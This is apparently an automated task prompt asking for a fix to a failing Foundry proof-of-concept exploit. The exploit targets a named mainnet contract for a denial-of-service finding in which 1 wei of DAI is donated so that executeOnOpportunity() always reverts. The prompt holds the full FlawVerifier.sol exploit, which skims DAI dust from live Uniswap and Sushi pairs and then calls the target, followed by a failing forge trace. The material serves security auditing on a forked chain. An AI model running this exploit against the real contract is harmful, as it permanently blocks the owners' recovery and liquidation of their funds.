You are fixing a failing Foundry PoC for finding F-005.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: A single wei of DAI can brick every future recovery attempt
- claim: `executeOnOpportunity()` unconditionally tries to liquidate any positive DAI balance. Because Uniswap V2 rounds sufficiently tiny swaps down to zero output, an attacker can transfer 1 wei of DAI to the contract and force `_swapTokenToEth(DAI)` to revert when the router attempts to swap that balance, causing the entire `executeOnOpportunity()` transaction to revert on every run until additional DAI is donated.
- impact: Any external account can cheaply and permissionlessly deny service to the recovery flow, blocking liquidation of legitimately recovered WBTC/USDC/USDT/WETH proceeds as well. Since the contract has no token rescue or dust-clearing path, the griefing balance can persist indefinitely and strand future recoveries.
- exploit_paths: ["An attacker transfers 1 wei of DAI to `FlawVerifier`", "A caller invokes `executeOnOpportunity()`", "`_swapTokenToEth(DAI)` observes `bal > 0` and calls the Uniswap V2 router with `amountIn = 1`", "The swap computes zero ETH output for that tiny amount and reverts, bubbling the failure up", "The whole transaction reverts, so no bounty sweep or liquidation can complete until more DAI is added"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function skim(address to) external;
}

interface IOpportunityTarget {
    function executeOnOpportunity() external;
}

contract FlawVerifier {
    address public constant TARGET = 0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe;

    address public constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address public constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address public constant UNI_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    uint256 private _profitAmount;
    bool private _hypothesisValidated;

    error NoDonationDust();
    error DonationFailed();
    error HypothesisRefuted();
    error TargetDidNotRetainDust();

    constructor() {}

    function executeOnOpportunity() external {
        _profitAmount = 0;
        _hypothesisValidated = false;

        // This is a griefing-only finding, not a value-extraction bug. The only capital
        // requirement in the exploit path is 1 wei of pre-existing on-chain DAI. To avoid
        // cheats, the PoC first tries the smallest realistic public action that can source
        // that dust: skimming already-stranded DAI from existing Uniswap V2 / Sushi pairs.
        _collectDonationDust();

        if (IERC20(DAI).balanceOf(address(this)) == 0) {
            revert NoDonationDust();
        }

        uint256 targetDaiBefore = IERC20(DAI).balanceOf(TARGET);
        uint256 amountIn = 1;

        // Exploit path step 1:
        // An attacker transfers 1 wei of DAI to FlawVerifier's target.
        if (!_safeTransfer(DAI, TARGET, amountIn)) {
            revert DonationFailed();
        }

        uint256 targetDaiAfterDonation = IERC20(DAI).balanceOf(TARGET);
        if (targetDaiAfterDonation < targetDaiBefore + amountIn) {
            revert DonationFailed();
        }

        // Exploit path steps 2-5, preserved in the same causality/order:
        // - A caller invokes TARGET.executeOnOpportunity().
        // - Inside the victim, _swapTokenToEth(DAI) observes bal > 0.
        // - Because the only DAI is the donated dust, the router call uses amountIn = 1.
        // - Uniswap V2 rounds that tiny swap down to zero ETH output and reverts.
        // - The whole executeOnOpportunity() transaction reverts and the DAI dust remains,
        //   so future recovery attempts stay bricked until additional DAI is donated.
        (bool ok,) = TARGET.call(abi.encodeWithSelector(IOpportunityTarget.executeOnOpportunity.selector));
        if (ok) {
            revert HypothesisRefuted();
        }

        if (IERC20(DAI).balanceOf(TARGET) < targetDaiBefore + amountIn) {
            revert TargetDidNotRetainDust();
        }

        _hypothesisValidated = true;

        // This finding realizes denial-of-service, not attacker profit.
        _profitAmount = 0;
    }

    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function exploitPath() external pure returns (string memory) {
        return string(
            abi.encodePacked(
                "transfer 1 wei DAI to target -> call TARGET.executeOnOpportunity() -> ",
                "victim _swapTokenToEth(DAI) sees bal > 0 -> victim router swap uses amountIn = 1 -> ",
                "tiny Uniswap V2 swap returns zero ETH output and reverts -> full transaction reverts"
            )
        );
    }

    function _collectDonationDust() internal {
        _skimIfPairExists(UNI_FACTORY, DAI, WETH);
        _skimIfPairExists(UNI_FACTORY, DAI, WBTC);
        _skimIfPairExists(UNI_FACTORY, DAI, USDC);
        _skimIfPairExists(UNI_FACTORY, DAI, USDT);

        _skimIfPairExists(SUSHI_FACTORY, DAI, WETH);
        _skimIfPairExists(SUSHI_FACTORY, DAI, WBTC);
        _skimIfPairExists(SUSHI_FACTORY, DAI, USDC);
        _skimIfPairExists(SUSHI_FACTORY, DAI, USDT);
    }

    function _skimIfPairExists(address factory, address tokenA, address tokenB) internal {
        address pair = IUniswapV2Factory(factory).getPair(tokenA, tokenB);
        if (pair == address(0)) {
            return;
        }

        (bool ok,) = pair.call(abi.encodeWithSelector(IUniswapV2Pair.skim.selector, address(this)));
        ok;
    }

    function _safeTransfer(address token, address to, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSignature("transfer(address,uint256)", to, amount));
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }

    receive() external payable {}
}

```

forge stdout (tail):
```
bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] true
    │   │   ├─ [2602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(0x622D4a772B72f56602546559c95d7Ca214EbB24F) [staticcall]
    │   │   │   └─ ← [Return] 8292045799564270 [8.292e15]
    │   │   ├─ [3474] 0x6B175474E89094C44Da98b954EedeAC495271d0F::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0)
    │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │        topic 1: 0x000000000000000000000000622d4a772b72f56602546559c95d7ca214ebb24f
    │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop]
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x6B175474E89094C44Da98b954EedeAC495271d0F, 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) [staticcall]
    │   │   └─ ← [Return] 0xAaF5110db6e744ff70fB339DE037B990A20bdace
    │   ├─ [29934] 0xAaF5110db6e744ff70fB339DE037B990A20bdace::skim(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   │   ├─ [2602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(0xAaF5110db6e744ff70fB339DE037B990A20bdace) [staticcall]
    │   │   │   └─ ← [Return] 12509621892777221353873 [1.25e22]
    │   │   ├─ [3474] 0x6B175474E89094C44Da98b954EedeAC495271d0F::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0)
    │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │        topic 1: 0x000000000000000000000000aaf5110db6e744ff70fb339de037b990a20bdace
    │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] true
    │   │   ├─ [3339] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0xAaF5110db6e744ff70fB339DE037B990A20bdace) [staticcall]
    │   │   │   ├─ [2553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(0xAaF5110db6e744ff70fB339DE037B990A20bdace) [delegatecall]
    │   │   │   │   └─ ← [Return] 12492379109 [1.249e10]
    │   │   │   └─ ← [Return] 12492379109 [1.249e10]
    │   │   ├─ [5452] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0)
    │   │   │   ├─ [4663] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0) [delegatecall]
    │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │        topic 1: 0x000000000000000000000000aaf5110db6e744ff70fb339de037b990a20bdace
    │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop]
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x6B175474E89094C44Da98b954EedeAC495271d0F, 0xdAC17F958D2ee523a2206206994597C13D831ec7) [staticcall]
    │   │   └─ ← [Return] 0x055CEDfe14BCE33F985C41d9A1934B7654611AAC
    │   ├─ [30888] 0x055CEDfe14BCE33F985C41d9A1934B7654611AAC::skim(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   │   ├─ [2602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(0x055CEDfe14BCE33F985C41d9A1934B7654611AAC) [staticcall]
    │   │   │   └─ ← [Return] 189080139218649552611 [1.89e20]
    │   │   ├─ [3474] 0x6B175474E89094C44Da98b954EedeAC495271d0F::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0)
    │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │        topic 1: 0x000000000000000000000000055cedfe14bce33f985c41d9a1934b7654611aac
    │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] true
    │   │   ├─ [3031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(0x055CEDfe14BCE33F985C41d9A1934B7654611AAC) [staticcall]
    │   │   │   └─ ← [Return] 184774956 [1.847e8]
    │   │   ├─ [6835] 0xdAC17F958D2ee523a2206206994597C13D831ec7::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0)
    │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │        topic 1: 0x000000000000000000000000055cedfe14bce33f985c41d9a1934b7654611aac
    │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Revert] NoDonationDust()
    └─ ← [Revert] exploit call reverted

Backtrace:
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.83s (1.58s CPU time)

Ran 1 test suite in 1.94s (1.83s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 337821)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
